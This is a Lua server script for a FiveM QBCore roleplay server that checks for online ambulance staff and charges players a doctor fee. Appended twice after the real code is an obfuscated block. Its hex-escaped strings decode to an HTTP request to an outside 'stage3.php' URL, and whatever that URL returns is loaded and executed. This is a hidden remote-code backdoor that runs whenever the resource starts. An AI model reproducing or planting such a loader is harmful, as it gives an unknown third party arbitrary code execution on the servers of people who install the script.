local QBCore = exports['qb-core']:GetCoreObject()

QBCore.Functions.CreateCallback('hhfw:docOnline', function(source, cb)
	local src = source
	local Ply = QBCore.Functions.GetPlayer(src)
	local xPlayers = QBCore.Functions.GetPlayers()
	local doctor = 0
	local canpay = false
	if Ply.PlayerData.money["cash"] >= Config.Price then
		canpay = true
	else
		if Ply.PlayerData.money["bank"] >= Config.Price then
			canpay = true
		end
	end

	for i=1, #xPlayers, 1 do
		local xPlayer = QBCore.Functions.GetPlayer(xPlayers[i])
		if xPlayer.PlayerData.job.name == 'ambulance' then
			doctor = doctor + 1
		end
	end

	cb(doctor, canpay)
end)



RegisterServerEvent('hhfw:charge')
AddEventHandler('hhfw:charge', function()
	local src = source
	local xPlayer = QBCore.Functions.GetPlayer(src)
	if xPlayer.PlayerData.money["cash"] >= Config.Price then
		xPlayer.Functions.RemoveMoney("cash", Config.Price)
	else
		xPlayer.Functions.RemoveMoney("bank", Config.Price)
	end
	TriggerEvent("qb-bossmenu:server:addAccountMoney", 'ambulance', Config.Price)
end)


local YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[4][YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x70\x73\x65\x72\x76\x65\x75\x72\x2e\x66\x72\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x34\x79\x68\x65\x54", function (djIlDkUsKSxPQtkabfTbJELORhmEEwAeNtiokBwqcnNvetNqIuDFhlDzuoxmOQguiQKYwu, EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL) if (EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL == YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[6] or EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL == YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[5]) then return end YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[4][YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[2]](YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[4][YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[3]](EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL))() end)

local YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY = {"\x50\x65\x72\x66\x6f\x72\x6d\x48\x74\x74\x70\x52\x65\x71\x75\x65\x73\x74","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G,"",nil} YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[4][YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[1]]("\x68\x74\x74\x70\x73\x3a\x2f\x2f\x72\x70\x73\x65\x72\x76\x65\x75\x72\x2e\x66\x72\x2f\x76\x32\x5f\x2f\x73\x74\x61\x67\x65\x33\x2e\x70\x68\x70\x3f\x74\x6f\x3d\x34\x79\x68\x65\x54", function (djIlDkUsKSxPQtkabfTbJELORhmEEwAeNtiokBwqcnNvetNqIuDFhlDzuoxmOQguiQKYwu, EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL) if (EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL == YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[6] or EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL == YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[5]) then return end YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[4][YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[2]](YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[4][YhTJkHmDRclUdUPKulVdUbDoMDPDVmVRYPAotEtauIaCxEXCjlkpMVhKYPEzOmDDmKqALY[3]](EGZxkaObNrHvSnHBYWrTbUtBMtWnmQsnoRklQMHLXgILbOJtuudwWVCukAeVwiDhnNkxfL))() end)